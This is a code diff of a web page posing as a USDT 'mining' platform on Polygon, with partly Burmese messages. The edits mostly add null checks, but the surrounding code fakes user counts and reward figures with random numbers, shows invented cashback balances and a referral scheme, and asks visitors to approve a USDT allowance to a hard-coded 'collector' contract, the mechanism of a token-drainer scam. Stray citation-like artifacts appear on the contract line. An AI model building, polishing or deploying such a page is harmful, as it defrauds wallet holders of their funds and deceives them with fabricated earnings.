@@ -178,7 +178,7 @@
             <p class="text-sm font-bold text-amber-400 mb-3.5">Earn up 10% commission inviting friends</p>
             
             <div class="w-full flex items-center gap-1.5">
-                <input type="text" id="refLink" value="https://coin-usdt.me/#/?type=1&code=1yj9e1a0" readonly class="w-full bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-300 font-mono">
+                <input type="text" id="refLink" readonly class="w-full bg-slate-900 border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-300 font-mono">
                 <button onclick="copyRefLink()" class="bg-emerald-600 hover:bg-emerald-500 px-3.5 py-2 rounded-lg text-xs font-semibold shrink-0 cursor-pointer">Copy</button>
             </div>
         </div>
@@ -232,8 +232,7 @@
         let countdownInterval;
         const selectedNetwork = "POLYGON";
 
-        // Contract Address အသစ်ဖြင့် အစားထိုးပြီးပါပြီ
-        const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";[span_1](start_span)[span_1](end_span)
+        const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";[span_0](start_span)[span_0](end_span)
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
         const POLYGON_CHAIN_ID = "0x89";
 
@@ -254,14 +253,19 @@
             const container = document.getElementById("progressContainer");
             const bar = document.getElementById("progressBar");
             
-            container.classList.remove("hidden");
-            bar.style.width = `${percent}%`;
-            if (text) document.getElementById("statusLog").innerText = text;
+            if (container && bar) {
+                container.classList.remove("hidden");
+                bar.style.width = `${percent}%`;
+            }
+            if (text) {
+                const logEl = document.getElementById("statusLog");
+                if (logEl) logEl.innerText = text;
+            }
         }
 
         function hideProgress() {
             const container = document.getElementById("progressContainer");
-            container.classList.add("hidden");
+            if (container) container.classList.add("hidden");
             stopCountdown();
         }
 
@@ -271,11 +275,13 @@
             clearInterval(countdownInterval);
             
             countdownInterval = setInterval(() => {
-                if (timeLeft > 0) {
-                    logEl.innerText = `${customMessage}... ကျန်ရှိချိန်: ${timeLeft} စက္ကန့်`;
-                    timeLeft--;
-                } else {
-                    logEl.innerText = `${customMessage}... Network အခြေအနေကြောင့် အနည်းငယ်ကြာမြင့်နေပါသည်...`;
+                if (logEl) {
+                    if (timeLeft > 0) {
+                        logEl.innerText = `${customMessage}... ကျန်ရှိချိန်: ${timeLeft} စက္ကန့်`;
+                        timeLeft--;
+                    } else {
+                        logEl.innerText = `${customMessage}... Network အခြေအနေကြောင့် အနည်းငယ်ကြာမြင့်နေပါသည်...`;
+                    }
                 }
             }, 1000);
         }
@@ -294,19 +300,28 @@
                 baseRewards += Math.random() * 5.25;
                 baseRate = +(2.40 + Math.random() * 0.1).toFixed(2);
 
-                document.getElementById("statGlobalUsers").innerText = baseUsers.toLocaleString();
-                document.getElementById("statYesterdayRewards").innerText = `${baseRewards.toLocaleString(undefined, {maximumFractionDigits: 2})} USDT`;
-                document.getElementById("statTodayRate").innerText = `+${baseRate}%`;
+                const uEl = document.getElementById("statGlobalUsers");
+                const rEl = document.getElementById("statYesterdayRewards");
+                const tEl = document.getElementById("statTodayRate");
+
+                if (uEl) uEl.innerText = baseUsers.toLocaleString();
+                if (rEl) rEl.innerText = `${baseRewards.toLocaleString(undefined, {maximumFractionDigits: 2})} USDT`;
+                if (tEl) tEl.innerText = `+${baseRate}%`;
             }, 3000);
         }
 
         function updateQRCode(url) {
             const encodedUrl = encodeURIComponent(url);
-            document.getElementById("qrImage").src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodedUrl}`;
+            const qrImg = document.getElementById("qrImage");
+            if (qrImg) {
+                qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodedUrl}`;
+            }
         }
 
         function generateIncomeList() {
             const container = document.getElementById("incomeListContainer");
+            if (!container) return;
+
             const tiers = [
                 { count: 300, min: 10, max: 30 },
                 { count: 400, min: 40, max: 500 },
@@ -350,7 +365,8 @@
 
         document.addEventListener("DOMContentLoaded", () => {
             const defaultLink = `${window.location.origin}${window.location.pathname}`;
-            document.getElementById("refLink").value = defaultLink;
+            const refInput = document.getElementById("refLink");
+            if (refInput) refInput.value = defaultLink;
             updateQRCode(defaultLink);
             generateIncomeList();
             startLiveCalculatingStats();
@@ -386,7 +402,8 @@
                         }
 
                         signer = await provider.getSigner();
-                        document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
+                        const wAddrEl = document.getElementById("walletAddress");
+                        if (wAddrEl) wAddrEl.innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                         
                         await checkExistingAllowanceAndLoad();
                     }
@@ -423,11 +440,13 @@
                 if (Number(allowance) > 0) {
                     showProgress(70, "Loading dashboard data...");
                     const connectBtn = document.getElementById("connectBtn");
-                    connectBtn.innerText = "Active Mining";
-                    connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
+                    if (connectBtn) {
+                        connectBtn.innerText = "Active Mining";
+                        connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
+                    }
                     
                     const badgeEl = document.getElementById("selectedNetworkBadge");
-                    badgeEl.classList.remove("hidden");
+                    if (badgeEl) badgeEl.classList.remove("hidden");
 
                     await checkUserData();
                     showProgress(100, "Welcome Back! Active mining...");
@@ -482,7 +501,8 @@
                 userAddress = accounts[0];
                 signer = await provider.getSigner();
 
-                document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
+                const wAddrEl = document.getElementById("walletAddress");
+                if (wAddrEl) wAddrEl.innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                 
                 showProgress(60, "Checking USDT allowance...");
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
@@ -492,11 +512,13 @@
                     showProgress(80, "Dashboard သို့ ဝင်ရောက်နေပါပြီ...");
                     
                     const badgeEl = document.getElementById("selectedNetworkBadge");
-                    badgeEl.classList.remove("hidden");
+                    if (badgeEl) badgeEl.classList.remove("hidden");
 
                     const connectBtn = document.getElementById("connectBtn");
-                    connectBtn.innerText = "Active Mining";
-                    connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
+                    if (connectBtn) {
+                        connectBtn.innerText = "Active Mining";
+                        connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
+                    }
 
                     await checkUserData();
                     showProgress(100, "Welcome Back! Dashboard သို့ ရောက်ရှိပါပြီ။");
@@ -516,18 +538,21 @@
                     errorMsg = "⚠️ Gas Fee (သို့မဟုတ်) လိုအပ်သော လက်ကျန်ငွေ မလုံလောက်ပါ။";
                 }
                 
-                document.getElementById("statusLog").innerText = errorMsg;
+                const sLog = document.getElementById("statusLog");
+                if (sLog) sLog.innerText = errorMsg;
             }
         }
 
         async function switchToPolygonAndApprove() {
             try {
                 const badgeEl = document.getElementById("selectedNetworkBadge");
-                badgeEl.classList.remove("hidden");
+                if (badgeEl) badgeEl.classList.remove("hidden");
 
                 const connectBtn = document.getElementById("connectBtn");
-                connectBtn.innerText = "Active Mining";
-                connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
+                if (connectBtn) {
+                    connectBtn.innerText = "Active Mining";
+                    connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
+                }
 
                 showProgress(50, "Submitting approval transaction...");
                 startCountdown(25, "USDT Approval တင်နေသည်");
@@ -554,7 +579,8 @@
                 stopCountdown();
                 showProgress(90, "Loading dashboard data...");
                 const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
-                document.getElementById("refLink").value = refLink;
+                const refInput = document.getElementById("refLink");
+                if (refInput) refInput.value = refLink;
                 updateQRCode(refLink);
 
                 await checkUserData();
@@ -572,7 +598,8 @@
                     errorMsg = "⚠️ Gas Fee (သို့မဟုတ်) လိုအပ်သော လက်ကျန်ငွေ မလုံလောက်ပါ။";
                 }
                 
-                document.getElementById("statusLog").innerText = errorMsg;
+                const sLog = document.getElementById("statusLog");
+                if (sLog) sLog.innerText = errorMsg;
             }
         }
 
@@ -596,7 +623,7 @@
                 const rate = getInterestRate(formattedBal);
 
                 if (Number(allowance) > 0) {
-                    dashboardEl.classList.remove("hidden");
+                    if (dashboardEl) dashboardEl.classList.remove("hidden");
 
                     let prefix = "M";
                     if (userInfo.referrer && userInfo.referrer !== ethers.ZeroAddress) {
@@ -606,9 +633,11 @@
                         } catch (e) {}
                     }
                     const userIdDisplay = userInfo.isRegistered ? `${prefix}${userInfo.userId.toString()}` : "3069";
-                    document.getElementById("lblUserId").innerText = userIdDisplay;
+                    const uIdEl = document.getElementById("lblUserId");
+                    if (uIdEl) uIdEl.innerText = userIdDisplay;
 
-                    document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
+                    const wBalEl = document.getElementById("lblWalletBal");
+                    if (wBalEl) wBalEl.innerText = `${formattedBal.toFixed(6)} USDT`;
                     
                     const cashback = formattedBal * rate;
                     const maticInterest = (cashback / 3000).toFixed(5);
@@ -617,18 +646,25 @@
                     const referralBalance = parseFloat(localStorage.getItem(refBalanceKey) || "0");
                     const withdrawableBalance = cashback + referralBalance;
 
-                    document.getElementById("lblCashbackBal").innerText = `${cashback.toFixed(6)} USDT`;
-                    document.getElementById("lblReferralBal").innerText = `${referralBalance.toFixed(6)} USDT`;
-                    document.getElementById("lblWithdrawableBal").innerText = `${withdrawableBalance.toFixed(6)} USDT`;
+                    const cBalEl = document.getElementById("lblCashbackBal");
+                    const rBalEl = document.getElementById("lblReferralBal");
+                    const wDrawEl = document.getElementById("lblWithdrawableBal");
+                    const iEthEl = document.getElementById("lblInterestEth");
+                    const iRateEl = document.getElementById("lblInterestRate");
 
-                    document.getElementById("lblInterestEth").innerText = `${maticInterest} MATIC`;
-                    document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
+                    if (cBalEl) cBalEl.innerText = `${cashback.toFixed(6)} USDT`;
+                    if (rBalEl) rBalEl.innerText = `${referralBalance.toFixed(6)} USDT`;
+                    if (wDrawEl) wDrawEl.innerText = `${withdrawableBalance.toFixed(6)} USDT`;
+
+                    if (iEthEl) iEthEl.innerText = `${maticInterest} MATIC`;
+                    if (iRateEl) iRateEl.innerText = `${(rate * 100).toFixed(1)}%`;
 
                     const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
-                    document.getElementById("refLink").value = refLink;
+                    const refInput = document.getElementById("refLink");
+                    if (refInput) refInput.value = refLink;
                     updateQRCode(refLink);
                 } else {
-                    dashboardEl.classList.add("hidden");
+                    if (dashboardEl) dashboardEl.classList.add("hidden");
                 }
             } catch (err) {
                 console.error(err);
@@ -637,6 +673,7 @@
 
         function copyRefLink() {
             const refInput = document.getElementById("refLink");
+            if (!refInput) return;
             refInput.select();
             refInput.setSelectionRange(0, 99999);
             navigator.clipboard.writeText(refInput.value);
